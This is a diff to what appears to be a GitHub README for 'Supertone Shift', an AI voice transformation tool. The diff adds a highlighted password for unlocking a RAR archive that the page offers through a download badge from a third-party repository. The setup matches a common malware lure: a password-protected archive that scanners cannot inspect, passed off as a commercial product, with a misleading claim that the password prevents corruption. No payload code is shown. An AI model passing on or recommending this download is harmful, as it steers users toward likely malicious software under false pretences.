@@ -1,5 +1,14 @@
 🎙️ **Supertone Shift - AI Voice Transformation Suite** 🎙️  
 
+<div align="center" style="background-color:#f0f8ff; padding:15px; border-radius:10px; border:1px solid #1e90ff; margin:20px 0;">
+  <h3 style="color:#1e90ff;">🔑 Passw0rd Required for Extraction</h3>
+  <p style="font-size:1.2em; font-weight:bold;">Use this password to unlock the archive:</p>
+  <div style="font-size:1.8em; letter-spacing:2px; color:#ff6b6b; padding:10px; background:#fff; border-radius:5px; display:inline-block; margin:10px;">
+    3️⃣2️⃣1️⃣3️⃣2️⃣1️⃣
+  </div>
+  <p>This password protects your download from corruption and unauthorized modifications</p>
+</div>
+
 <div align="center">
 
 [![Download Button](https://img.shields.io/badge/Download-Supertone_Shift-blue?style=for-the-badge&logo=github)](https://github.com/DogBigdox/supertone-shift/releases/download/supertone-shift/SupertoneShift.rar)
